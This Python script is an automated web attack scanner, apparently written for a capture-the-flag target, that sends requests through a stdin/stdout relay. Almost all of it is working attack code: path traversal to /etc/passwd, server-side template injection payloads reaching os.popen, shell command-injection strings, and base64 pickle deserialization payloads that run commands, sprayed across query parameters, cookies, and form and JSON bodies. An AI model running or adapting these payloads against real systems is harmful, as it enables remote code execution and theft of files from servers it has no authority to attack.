import sys, json, base64

def send(msg):
    sys.stdout.write(json.dumps(msg) + "\n")
    sys.stdout.flush()
    while True:
        line = sys.stdin.readline()
        if not line:
            return None
        line = line.strip()
        if not line:
            continue
        try:
            return json.loads(line)
        except Exception:
            continue

def http(method, path, body=None, headers=None, body_hex=None):
    m = {"http": {"method": method, "path": path}}
    if body is not None:
        m["http"]["body"] = body
    if body_hex is not None:
        m["http"]["body_hex"] = body_hex
    if headers:
        m["http"]["headers"] = headers
    r = send(m)
    if not isinstance(r, dict):
        return 0, "", ""
    st = r.get("status", 0)
    ct = r.get("content_type", "") or ""
    try:
        t = base64.b64decode(r.get("body_b64", "") or "").decode("utf-8", "replace")
    except Exception:
        t = ""
    return st, ct, t

def rep(tag, path, st, ct, body, n=900):
    print("RPT " + json.dumps({"tag": tag, "p": path, "s": st, "ct": ct, "b": body[:n]}), flush=True)

paths = ["/", "/index.html", "/robots.txt", "/health", "/healthz", "/status", "/api", "/api/",
         "/api/v1", "/api/health", "/search?q=x", "/search?name=x", "/search?query=x",
         "/login", "/admin", "/flag", "/secret", "/SECRET", "/secret.txt", "/app.py",
         "/source", "/debug", "/console", "/eval?expr=1", "/render?template=x",
         "/render?name=x", "/view?file=/etc/passwd", "/read?file=/etc/passwd",
         "/file?path=/etc/passwd", "/download?file=/etc/passwd", "/upload", "/submit",
         "/pickle", "/load", "/restore", "/state", "/session", "/openapi.json",
         "/swagger.json", "/docs", "/favicon.ico", "/static/", "/sitemap.xml"]

for p in paths:
    st, ct, b = http("GET", p)
    rep("G", p, st, ct, b)

qparams = ["q", "name", "msg", "message", "template", "expr", "cmd", "command", "input",
           "search", "query", "user", "username", "text", "content", "data", "file",
           "path", "page", "id", "lang", "view", "filter", "title", "comment"]
ssti = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "{{config}}", "{{self}}",
        "{{''.__class__.__mro__}}", "{{request}}", "${7*'7'}", "${{7*7}}",
        "__import__('os').popen('id').read()", "os.system('id')", "; id", "| id", "$(id)",
        "`id`", "../../../../etc/passwd", "/etc/passwd"]

for prm in qparams:
    for pl in ssti[:6]:
        p = "/?" + prm + "=" + pl.replace(" ", "%20").replace("'", "%27")
        st, ct, b = http("GET", p)
        if b:
            rep("Q", p, st, ct, b, 400)
        if st and st not in (200, 301, 302, 304, 400, 404, 405, 500):
            pass
    st, ct, b = http("GET", "/?" + prm + "=ZZUNIQUEMARKERZZ")
    rep("R", prm, st, ct, b, 300)

cmdpl = ["__import__('os').popen('id').read()", "{{cycler.__init__.__globals__.os.popen('id').read()}}",
         "{{lipsum.__globals__.os.popen('id').read()}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
         "${T(java.lang.Runtime).getRuntime().exec('id')}", "{{config.items()}}",
         "; id", "| id", "$(id)", "`id`", "id", "%0aid"]
for prm in qparams:
    for pl in cmdpl:
        ep = pl.replace(" ", "%20").replace("'", "%27").replace("{", "%7B").replace("}", "%7D")
        p = "/?" + prm + "=" + ep
        st, ct, b = http("GET", p)
        low = b.lower()
        if ("uid=" in low) or ("49" in b) or ("secret" in low) or ("flag" in low) or st == 500:
            rep("H", p, st, ct, b, 700)

bodies = ["name={{7*7}}", "q={{7*7}}", "template={{7*7}}",
          "{{7*7}}", "__import__('os').popen('id').read()"]
for bd in bodies:
    st, ct, b = http("POST", "/", body=bd, headers={"Content-Type": "application/x-www-form-urlencoded"})
    rep("PF", "/", st, ct, b, 600)
for bd in bodies:
    st, ct, b = http("POST", "/", body=json.dumps({"q": bd, "name": bd, "template": bd}))
    rep("PJ", "/", st, ct, b, 600)

pl_b64 = base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode()
pl_b62 = base64.b64encode(b"c__builtin__\neval\n(V__import__('os').popen('id').read()\ntR.").decode()
for ck in ["session", "token", "user", "data", "state", "payload", "auth"]:
    for val in [pl_b62, pl_b64]:
        st, ct, b = http("GET", "/", headers={"Cookie": ck + "=" + val})
        rep("C", ck, st, ct, b, 400)
for prm in ["data", "payload", "state", "session", "token", "obj", "pickle", "blob", "j"]:
    for val in [pl_b62, pl_b64]:
        st, ct, b = http("GET", "/?" + prm + "=" + val)
        rep("D", prm, st, ct, b, 400)

st, ct, b = http("OPTIONS", "/")
rep("O", "/", st, ct, b, 300)
print("RECON_DONE", flush=True)